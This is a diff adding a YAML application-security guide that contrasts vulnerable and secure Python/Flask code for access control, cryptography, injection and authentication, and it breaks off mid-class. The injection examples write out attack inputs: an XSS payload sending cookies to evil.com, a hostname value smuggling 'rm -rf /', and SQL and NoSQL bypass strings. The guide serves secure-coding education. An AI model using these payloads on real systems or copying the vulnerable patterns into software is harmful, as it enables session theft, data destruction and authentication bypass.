@@ -1,0 +1,2468 @@
+# =============================================================================
+# APPLICATION SECURITY (AppSec) MASTERY GUIDE
+# =============================================================================
+# Comprehensive security knowledge base for secure application development
+# Based on OWASP, NIST, and industry best practices
+# Last Updated: 2026-02-02
+# =============================================================================
+
+metadata:
+  version: "1.0.0"
+  standard_references:
+    - "OWASP Top 10 2021"
+    - "NIST SP 800-63B (Digital Identity Guidelines)"
+    - "CWE/SANS Top 25"
+    - "OWASP ASVS 4.0"
+  severity_levels:
+    critical: "Immediate exploitation possible, full system compromise"
+    high: "Significant data breach or privilege escalation"
+    medium: "Limited impact, requires specific conditions"
+    low: "Minor information disclosure"
+
+# =============================================================================
+# SECTION 1: OWASP TOP 10 (2021) VULNERABILITIES
+# =============================================================================
+
+owasp_top_10_2021:
+
+  A01_broken_access_control:
+    rank: 1
+    cwe_references: [CWE-200, CWE-201, CWE-352, CWE-425, CWE-639]
+    description: |
+      Failures in enforcing that users cannot act outside their intended permissions.
+      Access control enforces policy such that users cannot act outside of their
+      intended permissions.
+    
+    impact: critical
+    
+    common_vulnerabilities:
+      - name: "Insecure Direct Object Reference (IDOR)"
+        description: "Accessing resources by manipulating identifiers"
+        example_vulnerable: |
+          # VULNERABLE: User can access any order by changing ID
+          @app.route('/api/orders/<order_id>')
+          def get_order(order_id):
+              return Order.query.get(order_id).to_dict()
+        
+        example_secure: |
+          # SECURE: Verify ownership before returning data
+          @app.route('/api/orders/<order_id>')
+          @login_required
+          def get_order(order_id):
+              order = Order.query.get_or_404(order_id)
+              if order.user_id != current_user.id and not current_user.is_admin:
+                  abort(403)  # Forbidden
+              return order.to_dict()
+      
+      - name: "Missing Function Level Access Control"
+        description: "Admin functions accessible to regular users"
+        example_vulnerable: |
+          # VULNERABLE: No role check
+          @app.route('/admin/delete-user/<user_id>', methods=['DELETE'])
+          @login_required
+          def delete_user(user_id):
+              User.query.filter_by(id=user_id).delete()
+              return {'status': 'deleted'}
+        
+        example_secure: |
+          # SECURE: Role-based access control
+          from functools import wraps
+          
+          def admin_required(f):
+              @wraps(f)
+              def decorated_function(*args, **kwargs):
+                  if not current_user.is_authenticated:
+                      abort(401)
+                  if not current_user.has_role('admin'):
+                      abort(403)
+                  return f(*args, **kwargs)
+              return decorated_function
+          
+          @app.route('/admin/delete-user/<user_id>', methods=['DELETE'])
+          @admin_required
+          def delete_user(user_id):
+              User.query.filter_by(id=user_id).delete()
+              db.session.commit()
+              audit_log.record('user_deleted', user_id, current_user.id)
+              return {'status': 'deleted'}
+      
+      - name: "Privilege Escalation"
+        description: "Modifying own role or permissions"
+        example_vulnerable: |
+          # VULNERABLE: Accepts role from client
+          @app.route('/api/users', methods=['POST'])
+          def create_user():
+              data = request.json
+              user = User(
+                  email=data['email'],
+                  role=data.get('role', 'user')  # BAD: Client controls role
+              )
+              db.session.add(user)
+              return {'id': user.id}
+        
+        example_secure: |
+          # SECURE: Server controls role assignment
+          @app.route('/api/users', methods=['POST'])
+          def create_user():
+              data = request.json
+              allowed_fields = {'email', 'name', 'password'}
+              user_data = {k: v for k, v in data.items() if k in allowed_fields}
+              user = User(**user_data)
+              user.role = 'user'  # Always default, admin assigns later
+              db.session.add(user)
+              return {'id': user.id}
+    
+    prevention_techniques:
+      - "Deny by default - require explicit grants"
+      - "Implement access control checks server-side"
+      - "Use indirect object references (mapping tables)"
+      - "Log and alert on access control failures"
+      - "Rate limit API access to minimize automated abuse"
+      - "Disable web server directory listing"
+      - "Invalidate JWT tokens on logout (use blocklist)"
+
+  A02_cryptographic_failures:
+    rank: 2
+    cwe_references: [CWE-259, CWE-327, CWE-331, CWE-798]
+    description: |
+      Failures related to cryptography which often leads to sensitive data exposure.
+      Previously known as "Sensitive Data Exposure."
+    
+    impact: critical
+    
+    data_classification:
+      sensitive_data_types:
+        - "Passwords and credentials"
+        - "Credit card numbers (PCI-DSS)"
+        - "Personal health information (HIPAA)"
+        - "Personally identifiable information (PII)"
+        - "API keys and secrets"
+        - "Session tokens"
+    
+    common_vulnerabilities:
+      - name: "Weak Password Storage"
+        description: "Using MD5, SHA1, or unsalted hashes"
+        example_vulnerable: |
+          import hashlib
+          # VULNERABLE: MD5 is broken, no salt
+          def hash_password(password):
+              return hashlib.md5(password.encode()).hexdigest()
+          
+          # VULNERABLE: SHA256 without work factor
+          def hash_password_v2(password):
+              return hashlib.sha256(password.encode()).hexdigest()
+        
+        example_secure: |
+          import bcrypt
+          from argon2 import PasswordHasher
+          
+          # SECURE: bcrypt with automatic salt
+          def hash_password_bcrypt(password: str) -> bytes:
+              salt = bcrypt.gensalt(rounds=12)  # 2^12 iterations
+              return bcrypt.hashpw(password.encode('utf-8'), salt)
+          
+          def verify_password_bcrypt(password: str, hashed: bytes) -> bool:
+              return bcrypt.checkpw(password.encode('utf-8'), hashed)
+          
+          # SECURE: Argon2id (recommended for new systems)
+          ph = PasswordHasher(
+              time_cost=3,        # Number of iterations
+              memory_cost=65536,  # 64 MB memory usage
+              parallelism=4,      # Number of parallel threads
+              hash_len=32,        # Length of the hash
+              salt_len=16         # Length of random salt
+          )
+          
+          def hash_password_argon2(password: str) -> str:
+              return ph.hash(password)
+          
+          def verify_password_argon2(password: str, hash: str) -> bool:
+              try:
+                  ph.verify(hash, password)
+                  return True
+              except:
+                  return False
+      
+      - name: "Insecure Data Transmission"
+        description: "Transmitting sensitive data over HTTP"
+        example_secure: |
+          # Force HTTPS in Flask
+          from flask_talisman import Talisman
+          
+          app = Flask(__name__)
+          Talisman(app, force_https=True)
+          
+          # Configure secure cookies
+          app.config.update(
+              SESSION_COOKIE_SECURE=True,
+              SESSION_COOKIE_HTTPONLY=True,
+              SESSION_COOKIE_SAMESITE='Lax'
+          )
+      
+      - name: "Hardcoded Secrets"
+        description: "Credentials in source code"
+        example_vulnerable: |
+          # VULNERABLE: Hardcoded credentials
+          DATABASE_URL = "postgresql://admin:SuperSecret123@localhost/db"
+          API_KEY = "sk-1234567890abcdef"
+        
+        example_secure: |
+          import os
+          from dotenv import load_dotenv
+          
+          load_dotenv()  # Load from .env file (not in version control)
+          
+          DATABASE_URL = os.environ.get('DATABASE_URL')
+          API_KEY = os.environ.get('API_KEY')
+          
+          if not DATABASE_URL or not API_KEY:
+              raise EnvironmentError("Missing required environment variables")
+    
+    encryption_requirements:
+      at_rest:
+        - "AES-256-GCM for symmetric encryption"
+        - "Database-level encryption (TDE)"
+        - "Encrypted file systems for sensitive data"
+      in_transit:
+        - "TLS 1.2 minimum, prefer TLS 1.3"
+        - "Strong cipher suites only"
+        - "Certificate pinning for mobile apps"
+      key_management:
+        - "Use HSM or cloud KMS for key storage"
+        - "Rotate keys regularly (90 days recommended)"
+        - "Never store keys alongside encrypted data"
+
+  A03_injection:
+    rank: 3
+    cwe_references: [CWE-79, CWE-89, CWE-94, CWE-77]
+    description: |
+      User-supplied data is not validated, filtered, or sanitized by the application.
+      Includes SQL, NoSQL, OS Command, LDAP, and XSS injection.
+    
+    impact: critical
+    
+    injection_types:
+      
+      sql_injection:
+        description: "Manipulating SQL queries through user input"
+        example_vulnerable: |
+          # VULNERABLE: String concatenation
+          def get_user(username):
+              query = f"SELECT * FROM users WHERE username = '{username}'"
+              return db.execute(query).fetchone()
+          
+          # Attack: username = "' OR '1'='1' --"
+          # Results in: SELECT * FROM users WHERE username = '' OR '1'='1' --'
+        
+        example_secure: |
+          # SECURE: Parameterized queries
+          def get_user(username):
+              query = "SELECT * FROM users WHERE username = %s"
+              return db.execute(query, (username,)).fetchone()
+          
+          # SECURE: Using ORM (SQLAlchemy)
+          def get_user_orm(username):
+              return User.query.filter_by(username=username).first()
+          
+          # SECURE: For dynamic queries, use whitelist
+          ALLOWED_SORT_COLUMNS = {'name', 'email', 'created_at'}
+          
+          def get_users_sorted(sort_by):
+              if sort_by not in ALLOWED_SORT_COLUMNS:
+                  sort_by = 'created_at'
+              return User.query.order_by(text(sort_by)).all()
+      
+      nosql_injection:
+        description: "Attacking NoSQL databases through operator injection"
+        example_vulnerable: |
+          # VULNERABLE: MongoDB with unsanitized input
+          def login(username, password):
+              user = db.users.find_one({
+                  'username': username,
+                  'password': password  # Could be {'$ne': ''}
+              })
+              return user is not None
+          
+          # Attack: password = {"$ne": ""}
+          # Returns first user where password is not empty
+        
+        example_secure: |
+          # SECURE: Type validation and sanitization
+          def login(username, password):
+              if not isinstance(username, str) or not isinstance(password, str):
+                  raise ValueError("Invalid input types")
+              
+              # Hash comparison should be done separately
+              user = db.users.find_one({'username': username})
+              if user and verify_password(password, user['password_hash']):
+                  return user
+              return None
+      
+      command_injection:
+        description: "Executing arbitrary OS commands"
+        example_vulnerable: |
+          import os
+          
+          # VULNERABLE: Shell injection
+          def ping_host(hostname):
+              return os.system(f"ping -c 1 {hostname}")
+          
+          # Attack: hostname = "google.com; rm -rf /"
+        
+        example_secure: |
+          import subprocess
+          import re
+          
+          # SECURE: Use subprocess with shell=False and validate input
+          def ping_host(hostname):
+              # Whitelist validation for hostname format
+              if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]*[a-zA-Z0-9]$', hostname):
+                  raise ValueError("Invalid hostname format")
+              
+              result = subprocess.run(
+                  ['ping', '-c', '1', hostname],
+                  capture_output=True,
+                  text=True,
+                  timeout=10,
+                  shell=False  # Critical: never use shell=True with user input
+              )
+              return result.returncode == 0
+      
+      xss_cross_site_scripting:
+        description: "Injecting malicious scripts into web pages"
+        types:
+          - "Reflected XSS: Input reflected in response"
+          - "Stored XSS: Input stored and displayed to others"
+          - "DOM-based XSS: Client-side script manipulation"
+        
+        example_vulnerable: |
+          # VULNERABLE: Rendering user input without escaping
+          @app.route('/search')
+          def search():
+              query = request.args.get('q', '')
+              return f"<h1>Results for: {query}</h1>"
+          
+          # Attack: q=<script>document.location='http://evil.com/?c='+document.cookie</script>
+        
+        example_secure: |
+          from markupsafe import escape
+          from flask import render_template
+          
+          # SECURE: HTML escaping
+          @app.route('/search')
+          def search():
+              query = request.args.get('q', '')
+              # Option 1: Manual escaping
+              return f"<h1>Results for: {escape(query)}</h1>"
+          
+          # Option 2: Template auto-escaping (preferred)
+          # In template: <h1>Results for: {{ query }}</h1>
+          # Jinja2 auto-escapes by default
+          
+          # For JavaScript context, use JSON encoding
+          import json
+          @app.route('/api/data')
+          def api_data():
+              user_input = request.args.get('input', '')
+              return render_template('page.html', 
+                  data_json=json.dumps(user_input))
+          
+          # In template:
+          # <script>var data = {{ data_json | safe }};</script>
+    
+    prevention_principles:
+      - "Use parameterized queries/prepared statements"
+      - "Implement strict input validation (whitelist)"
+      - "Encode output based on context (HTML, JS, URL, CSS)"
+      - "Use ORMs with parameterized queries"
+      - "Apply least privilege to database accounts"
+      - "Use Content-Security-Policy headers"
+
+  A07_identification_authentication_failures:
+    rank: 7
+    cwe_references: [CWE-287, CWE-384, CWE-613, CWE-620]
+    description: |
+      Confirmation of the user's identity, authentication, and session management
+      is critical to protect against authentication-related attacks.
+    
+    impact: critical
+    
+    common_vulnerabilities:
+      - name: "Credential Stuffing"
+        description: "Automated attacks using breached credential lists"
+        prevention: |
+          # Implement rate limiting and account lockout
+          from flask_limiter import Limiter
+          
+          limiter = Limiter(app, key_func=get_remote_address)
+          
+          # Track failed attempts
+          failed_attempts = {}  # Use Redis in production
+          
+          @app.route('/login', methods=['POST'])
+          @limiter.limit("5 per minute")
+          def login():
+              email = request.json.get('email')
+              
+              # Check if account is locked
+              if is_account_locked(email):
+                  return {'error': 'Account temporarily locked'}, 429
+              
+              user = authenticate(email, request.json.get('password'))
+              if not user:
+                  record_failed_attempt(email)
+                  return {'error': 'Invalid credentials'}, 401
+              
+              clear_failed_attempts(email)
+              return create_session(user)
+          
+          def is_account_locked(email):
+              attempts = failed_attempts.get(email, [])
+              recent = [a for a in attempts if a > time.time() - 900]  # 15 min
+              return len(recent) >= 5
+          
+          def record_failed_attempt(email):
+              if email not in failed_attempts:
+                  failed_attempts[email] = []
+              failed_attempts[email].append(time.time())
+      
+      - name: "Weak Session Management"
+        description: "Predictable session IDs, no expiration"
+        example_secure: |
+          import secrets
+          from datetime import datetime, timedelta
+          
+          class SecureSessionManager:
+              def __init__(self, redis_client):
+                  self.redis = redis_client
+                  self.session_duration = timedelta(hours=24)
+                  self.idle_timeout = timedelta(minutes=30)
+              
+              def create_session(self, user_id: int) -> str:
+                  # Generate cryptographically secure session ID
+                  session_id = secrets.token_urlsafe(32)  # 256 bits
+                  
+                  session_data = {
+                      'user_id': user_id,
+                      'created_at': datetime.utcnow().isoformat(),
+                      'last_activity': datetime.utcnow().isoformat(),
+                      'ip_address': request.remote_addr,
+                      'user_agent': request.user_agent.string
+                  }
+                  
+                  # Store with absolute expiration
+                  self.redis.setex(
+                      f"session:{session_id}",
+                      self.session_duration,
+                      json.dumps(session_data)
+                  )
+                  
+                  return session_id
+              
+              def validate_session(self, session_id: str) -> dict:
+                  data = self.redis.get(f"session:{session_id}")
+                  if not data:
+                      return None
+                  
+                  session = json.loads(data)
+                  last_activity = datetime.fromisoformat(session['last_activity'])
+                  
+                  # Check idle timeout
+                  if datetime.utcnow() - last_activity > self.idle_timeout:
+                      self.invalidate_session(session_id)
+                      return None
+                  
+                  # Update last activity
+                  session['last_activity'] = datetime.utcnow().isoformat()
+                  self.redis.setex(
+                      f"session:{session_id}",
+                      self.session_duration,
+                      json.dumps(session)
+                  )
+                  
+                  return session
+              
+              def invalidate_session(self, session_id: str):
+                  self.redis.delete(f"session:{session_id}")
+              
+              def invalidate_all_user_sessions(self, user_id: int):
+                  """Logout from all devices"""
+                  for key in self.redis.scan_iter("session:*"):
+                      data = self.redis.get(key)
+                      if data:
+                          session = json.loads(data)
+                          if session.get('user_id') == user_id:
+                              self.redis.delete(key)
+      
+      - name: "Insecure Password Reset"
+        description: "Predictable tokens, no expiration"
+        example_secure: |
+          import secrets
+          from datetime import datetime, timedelta
+          import hashlib
+          
+          class SecurePasswordReset:
+              def __init__(self, redis_client):
+                  self.redis = redis_client
+                  self.token_expiry = timedelta(hours=1)
+              
+              def create_reset_token(self, user_email: str) -> str:
+                  # Generate secure random token
+                  token = secrets.token_urlsafe(32)
+                  
+                  # Store hash of token (not the token itself)
+                  token_hash = hashlib.sha256(token.encode()).hexdigest()
+                  
+                  # Invalidate any existing tokens for this user
+                  old_hash = self.redis.get(f"reset_user:{user_email}")
+                  if old_hash:
+                      self.redis.delete(f"reset_token:{old_hash.decode()}")
+                  
+                  # Store new token with expiration
+                  reset_data = {
+                      'email': user_email,
+                      'created_at': datetime.utcnow().isoformat()
+                  }
+                  
+                  self.redis.setex(
+                      f"reset_token:{token_hash}",
+                      self.token_expiry,
+                      json.dumps(reset_data)
+                  )
+                  self.redis.setex(
+                      f"reset_user:{user_email}",
+                      self.token_expiry,
+                      token_hash
+                  )
+                  
+                  return token  # Send this in email
+              
+              def validate_and_consume_token(self, token: str) -> str:
+                  """Returns user email if valid, None otherwise"""
+                  token_hash = hashlib.sha256(token.encode()).hexdigest()
+                  
+                  data = self.redis.get(f"reset_token:{token_hash}")
+                  if not data:
+                      return None
+                  
+                  reset_data = json.loads(data)
+                  
+                  # Delete token (single use)
+                  self.redis.delete(f"reset_token:{token_hash}")
+                  self.redis.delete(f"reset_user:{reset_data['email']}")
+                  
+                  return reset_data['email']
+              
+              def send_reset_email(self, email: str):
+                  user = User.query.filter_by(email=email).first()
+                  
+                  # Always respond the same way (prevent enumeration)
+                  if user:
+                      token = self.create_reset_token(email)
+                      # Send email with: /reset-password?token={token}
+                      send_email(email, token)
+                  
+                  # Same response regardless of user existence
+                  return "If an account exists, a reset link was sent."
+
+# =============================================================================
+# SECTION 2: AUTHENTICATION SECURITY
+# =============================================================================
+
+authentication_security:
+  
+  password_hashing:
+    recommended_algorithms:
+      argon2id:
+        description: "Winner of Password Hashing Competition, memory-hard"
+        parameters:
+          time_cost: 3          # iterations
+          memory_cost: 65536    # 64 MB in KB
+          parallelism: 4        # threads
+          hash_len: 32          # bytes
+          salt_len: 16          # bytes
+        use_case: "New applications, highest security"
+      
+      bcrypt:
+        description: "Battle-tested, widely supported"
+        parameters:
+          rounds: 12            # 2^12 iterations, ~250ms
+          max_password_length: 72  # bytes (limitation!)
+        use_case: "Legacy systems, broad compatibility"
+      
+      scrypt:
+        description: "Memory-hard, configurable"
+        parameters:
+          n: 16384              # CPU/memory cost (2^14)
+          r: 8                  # block size
+          p: 1                  # parallelism
+          dklen: 32             # derived key length
+        use_case: "When Argon2 unavailable"
+    
+    avoid_algorithms:
+      - algorithm: "MD5"
+        reason: "Cryptographically broken, fast to crack"
+      - algorithm: "SHA-1"
+        reason: "Collision attacks demonstrated"
+      - algorithm: "SHA-256 (plain)"
+        reason: "Too fast without key stretching"
+      - algorithm: "PBKDF2-SHA1"
+        reason: "GPU-friendly, prefer memory-hard functions"
+    
+    implementation: |
+      # Complete secure password handling module
+      from argon2 import PasswordHasher, Type
+      from argon2.exceptions import VerifyMismatchError, InvalidHash
+      import secrets
+      import re
+      
+      class SecurePasswordHandler:
+          def __init__(self):
+              self.hasher = PasswordHasher(
+                  time_cost=3,
+                  memory_cost=65536,
+                  parallelism=4,
+                  hash_len=32,
+                  salt_len=16,
+                  type=Type.ID  # Argon2id
+              )
+              
+              # Password policy
+              self.min_length = 12
+              self.require_uppercase = True
+              self.require_lowercase = True
+              self.require_digit = True
+              self.require_special = True
+          
+          def validate_password_strength(self, password: str) -> tuple[bool, list]:
+              """Returns (is_valid, list_of_errors)"""
+              errors = []
+              
+              if len(password) < self.min_length:
+                  errors.append(f"Password must be at least {self.min_length} characters")
+              
+              if self.require_uppercase and not re.search(r'[A-Z]', password):
+                  errors.append("Password must contain uppercase letter")
+              
+              if self.require_lowercase and not re.search(r'[a-z]', password):
+                  errors.append("Password must contain lowercase letter")
+              
+              if self.require_digit and not re.search(r'\d', password):
+                  errors.append("Password must contain a digit")
+              
+              if self.require_special and not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+                  errors.append("Password must contain special character")
+              
+              # Check against common passwords (use a proper list in production)
+              common_passwords = {'password', 'password123', '123456', 'qwerty'}
+              if password.lower() in common_passwords:
+                  errors.append("Password is too common")
+              
+              return len(errors) == 0, errors
+          
+          def hash_password(self, password: str) -> str:
+              """Hash password with Argon2id"""
+              return self.hasher.hash(password)
+          
+          def verify_password(self, password: str, hash: str) -> bool:
+              """Verify password against hash, timing-safe"""
+              try:
+                  self.hasher.verify(hash, password)
+                  return True
+              except (VerifyMismatchError, InvalidHash):
+                  return False
+          
+          def needs_rehash(self, hash: str) -> bool:
+              """Check if hash needs updating (params changed)"""
+              return self.hasher.check_needs_rehash(hash)
+          
+          def generate_temporary_password(self, length: int = 16) -> str:
+              """Generate secure temporary password"""
+              alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
+              return ''.join(secrets.choice(alphabet) for _ in range(length))
+
+  multi_factor_authentication:
+    totp_implementation: |
+      # Time-based One-Time Password (TOTP) - RFC 6238
+      import pyotp
+      import qrcode
+      from io import BytesIO
+      import base64
+      
+      class TOTPManager:
+          def __init__(self, issuer_name: str = "MyApp"):
+              self.issuer = issuer_name
+          
+          def generate_secret(self) -> str:
+              """Generate new TOTP secret for user"""
+              return pyotp.random_base32()
+          
+          def get_provisioning_uri(self, secret: str, user_email: str) -> str:
+              """Generate URI for authenticator apps"""
+              totp = pyotp.TOTP(secret)
+              return totp.provisioning_uri(
+                  name=user_email,
+                  issuer_name=self.issuer
+              )
+          
+          def generate_qr_code(self, secret: str, user_email: str) -> str:
+              """Generate QR code as base64 image"""
+              uri = self.get_provisioning_uri(secret, user_email)
+              qr = qrcode.QRCode(version=1, box_size=10, border=5)
+              qr.add_data(uri)
+              qr.make(fit=True)
+              
+              img = qr.make_image(fill_color="black", back_color="white")
+              buffer = BytesIO()
+              img.save(buffer, format='PNG')
+              return base64.b64encode(buffer.getvalue()).decode()
+          
+          def verify_totp(self, secret: str, token: str) -> bool:
+              """Verify TOTP token (allows 1 step tolerance)"""
+              if not token or not token.isdigit() or len(token) != 6:
+                  return False
+              
+              totp = pyotp.TOTP(secret)
+              # valid_window=1 allows for clock skew (30 sec each direction)
+              return totp.verify(token, valid_window=1)
+          
+          def generate_backup_codes(self, count: int = 10) -> list[str]:
+              """Generate one-time backup codes"""
+              return [secrets.token_hex(4).upper() for _ in range(count)]
+      
+      # Usage in login flow
+      class MFALoginFlow:
+          def __init__(self, totp_manager, redis_client):
+              self.totp = totp_manager
+              self.redis = redis_client
+          
+          def initiate_mfa(self, user_id: int) -> str:
+              """Create temporary token for MFA step"""
+              mfa_token = secrets.token_urlsafe(32)
+              self.redis.setex(
+                  f"mfa_pending:{mfa_token}",
+                  300,  # 5 minutes to complete MFA
+                  str(user_id)
+              )
+              return mfa_token
+          
+          def complete_mfa(self, mfa_token: str, totp_code: str) -> bool:
+              """Verify MFA and return session"""
+              user_id = self.redis.get(f"mfa_pending:{mfa_token}")
+              if not user_id:
+                  return None
+              
+              user = User.query.get(int(user_id))
+              if not user or not user.totp_secret:
+                  return None
+              
+              if self.totp.verify_totp(user.totp_secret, totp_code):
+                  self.redis.delete(f"mfa_pending:{mfa_token}")
+                  return create_session(user)
+              
+              return None
+
+  account_lockout_strategy:
+    implementation: |
+      from datetime import datetime, timedelta
+      from collections import defaultdict
+      import threading
+      
+      class AccountLockoutManager:
+          """
+          Progressive lockout with exponential backoff:
+          - 5 failures: 1 minute lockout
+          - 10 failures: 5 minute lockout
+          - 15 failures: 30 minute lockout
+          - 20+ failures: Account disabled, manual unlock required
+          """
+          
+          def __init__(self, redis_client):
+              self.redis = redis_client
+              self.lockout_thresholds = [
+                  (5, timedelta(minutes=1)),
+                  (10, timedelta(minutes=5)),
+                  (15, timedelta(minutes=30)),
+              ]
+              self.permanent_lockout_threshold = 20
+          
+          def record_failure(self, identifier: str) -> dict:
+              """
+              Record failed attempt, return lockout status
+              identifier: email or IP address
+              """
+              key = f"auth_failures:{identifier}"
+              
+              # Increment failure count
+              failures = self.redis.incr(key)
+              
+              # Set expiry on first failure (24 hour window)
+              if failures == 1:
+                  self.redis.expire(key, 86400)
+              
+              # Check thresholds
+              lockout_duration = None
+              for threshold, duration in self.lockout_thresholds:
+                  if failures >= threshold:
+                      lockout_duration = duration
+              
+              if failures >= self.permanent_lockout_threshold:
+                  # Permanent lockout - requires manual intervention
+                  self.redis.set(f"account_disabled:{identifier}", "1")
+                  return {
+                      'locked': True,
+                      'permanent': True,
+                      'message': 'Account disabled. Contact support.'
+                  }
+              
+              if lockout_duration:
+                  lockout_until = datetime.utcnow() + lockout_duration
+                  self.redis.setex(
+                      f"lockout:{identifier}",
+                      lockout_duration,
+                      lockout_until.isoformat()
+                  )
+                  return {
+                      'locked': True,
+                      'permanent': False,
+                      'unlock_at': lockout_until.isoformat(),
+                      'attempts': failures
+                  }
+              
+              return {
+                  'locked': False,
+                  'attempts': failures,
+                  'remaining': self.lockout_thresholds[0][0] - failures
+              }
+          
+          def is_locked(self, identifier: str) -> tuple[bool, str]:
+              """Check if account/IP is locked"""
+              # Check permanent lockout
+              if self.redis.get(f"account_disabled:{identifier}"):
+                  return True, "Account disabled. Contact support."
+              
+              # Check temporary lockout
+              lockout = self.redis.get(f"lockout:{identifier}")
+              if lockout:
+                  unlock_at = datetime.fromisoformat(lockout.decode())
+                  remaining = (unlock_at - datetime.utcnow()).total_seconds()
+                  return True, f"Locked for {int(remaining)} seconds"
+              
+              return False, None
+          
+          def clear_failures(self, identifier: str):
+              """Clear on successful login"""
+              self.redis.delete(f"auth_failures:{identifier}")
+              self.redis.delete(f"lockout:{identifier}")
+          
+          def admin_unlock(self, identifier: str):
+              """Admin function to unlock account"""
+              self.redis.delete(f"account_disabled:{identifier}")
+              self.redis.delete(f"auth_failures:{identifier}")
+              self.redis.delete(f"lockout:{identifier}")
+
+# =============================================================================
+# SECTION 3: CRYPTOGRAPHY BEST PRACTICES
+# =============================================================================
+
+cryptography_best_practices:
+  
+  symmetric_vs_asymmetric:
+    symmetric:
+      use_cases:
+        - "Encrypting data at rest"
+        - "Encrypting session data"
+        - "Bulk data encryption"
+        - "Database field encryption"
+      algorithms:
+        recommended: ["AES-256-GCM", "ChaCha20-Poly1305"]
+        avoid: ["DES", "3DES", "AES-ECB", "RC4"]
+      key_exchange: "Key must be shared securely (use asymmetric for this)"
+    
+    asymmetric:
+      use_cases:
+        - "Key exchange"
+        - "Digital signatures"
+        - "Certificate-based authentication"
+        - "Encrypting small amounts of data"
+      algorithms:
+        recommended: ["RSA-2048+", "ECDSA P-256+", "Ed25519"]
+        avoid: ["RSA-1024", "DSA"]
+      limitation: "Much slower than symmetric, size limits"
+
+  aes_modes_comparison:
+    AES_GCM:
+      full_name: "Galois/Counter Mode"
+      properties:
+        - "Authenticated encryption (AEAD)"
+        - "Provides confidentiality AND integrity"
+        - "Detects tampering automatically"
+        - "Parallelizable (fast)"
+      requirements:
+        - "Unique nonce per encryption (96 bits recommended)"
+        - "NEVER reuse nonce with same key"
+      recommended: true
+      
+    AES_CBC:
+      full_name: "Cipher Block Chaining"
+      properties:
+        - "Confidentiality only (no integrity)"
+        - "Requires separate MAC for authentication"
+        - "Vulnerable to padding oracle attacks"
+      requirements:
+        - "Random IV per encryption"
+        - "Must use with HMAC for integrity"
+      recommended: false
+      note: "Use AES-GCM instead unless specific requirement"
+    
+    implementation: |
+      from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+      from cryptography.hazmat.primitives import hashes
+      from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+      import os
+      import base64
+      
+      class SecureEncryption:
+          """AES-256-GCM encryption with proper key derivation"""
+          
+          def __init__(self):
+              self.nonce_size = 12  # 96 bits for GCM
+              self.key_size = 32    # 256 bits
+          
+          def derive_key(self, password: str, salt: bytes) -> bytes:
+              """Derive encryption key from password"""
+              kdf = PBKDF2HMAC(
+                  algorithm=hashes.SHA256(),
+                  length=self.key_size,
+                  salt=salt,
+                  iterations=600000,  # OWASP 2023 recommendation
+              )
+              return kdf.derive(password.encode())
+          
+          def generate_key(self) -> bytes:
+              """Generate random encryption key"""
+              return os.urandom(self.key_size)
+          
+          def encrypt(self, key: bytes, plaintext: bytes, 
+                      associated_data: bytes = None) -> bytes:
+              """
+              Encrypt with AES-256-GCM
+              Returns: nonce + ciphertext + tag (concatenated)
+              """
+              nonce = os.urandom(self.nonce_size)
+              aesgcm = AESGCM(key)
+              ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
+              return nonce + ciphertext
+          
+          def decrypt(self, key: bytes, ciphertext: bytes,
+                      associated_data: bytes = None) -> bytes:
+              """
+              Decrypt AES-256-GCM ciphertext
+              Input format: nonce + ciphertext + tag
+              """
+              nonce = ciphertext[:self.nonce_size]
+              actual_ciphertext = ciphertext[self.nonce_size:]
+              aesgcm = AESGCM(key)
+              return aesgcm.decrypt(nonce, actual_ciphertext, associated_data)
+          
+          def encrypt_string(self, key: bytes, plaintext: str) -> str:
+              """Convenience method for string encryption"""
+              encrypted = self.encrypt(key, plaintext.encode('utf-8'))
+              return base64.b64encode(encrypted).decode('ascii')
+          
+          def decrypt_string(self, key: bytes, ciphertext: str) -> str:
+              """Convenience method for string decryption"""
+              encrypted = base64.b64decode(ciphertext.encode('ascii'))
+              decrypted = self.decrypt(key, encrypted)
+              return decrypted.decode('utf-8')
+      
+      # Field-level database encryption
+      class EncryptedField:
+          """SQLAlchemy-compatible encrypted field"""
+          
+          def __init__(self, key: bytes):
+              self.crypto = SecureEncryption()
+              self.key = key
+          
+          def encrypt_value(self, value: str) -> str:
+              if value is None:
+                  return None
+              return self.crypto.encrypt_string(self.key, value)
+          
+          def decrypt_value(self, value: str) -> str:
+              if value is None:
+                  return None
+              return self.crypto.decrypt_string(self.key, value)
+
+  key_management:
+    principles:
+      - "Keys should never be stored in source code"
+      - "Keys should never be stored alongside encrypted data"
+      - "Use separate keys for different purposes"
+      - "Implement key rotation procedures"
+      - "Use HSM or cloud KMS in production"
+    
+    rotation_strategy: |
+      class KeyRotationManager:
+          """
+          Implements key versioning for seamless rotation.
+          Format: {version}:{encrypted_data}
+          """
+          
+          def __init__(self, kms_client):
+              self.kms = kms_client
+              self.crypto = SecureEncryption()
+          
+          def get_current_key_version(self) -> tuple[int, bytes]:
+              """Get current active key from KMS"""
+              key_info = self.kms.get_current_key('data-encryption')
+              return key_info['version'], key_info['key']
+          
+          def get_key_by_version(self, version: int) -> bytes:
+              """Get specific key version for decryption"""
+              return self.kms.get_key('data-encryption', version)['key']
+          
+          def encrypt(self, plaintext: bytes) -> str:
+              """Encrypt with current key, include version"""
+              version, key = self.get_current_key_version()
+              encrypted = self.crypto.encrypt(key, plaintext)
+              encoded = base64.b64encode(encrypted).decode()
+              return f"{version}:{encoded}"
+          
+          def decrypt(self, versioned_ciphertext: str) -> bytes:
+              """Decrypt using appropriate key version"""
+              version_str, encoded = versioned_ciphertext.split(':', 1)
+              version = int(version_str)
+              key = self.get_key_by_version(version)
+              ciphertext = base64.b64decode(encoded)
+              return self.crypto.decrypt(key, ciphertext)
+          
+          def re_encrypt_with_current_key(self, versioned_ciphertext: str) -> str:
+              """Re-encrypt data with current key (for rotation)"""
+              plaintext = self.decrypt(versioned_ciphertext)
+              return self.encrypt(plaintext)
+
+  secure_random:
+    implementation: |
+      import secrets
+      import os
+      
+      class SecureRandom:
+          """Cryptographically secure random generation"""
+          
+          @staticmethod
+          def bytes(length: int) -> bytes:
+              """Generate random bytes"""
+              return secrets.token_bytes(length)
+          
+          @staticmethod
+          def hex(length: int) -> str:
+              """Generate random hex string (2x length characters)"""
+              return secrets.token_hex(length)
+          
+          @staticmethod
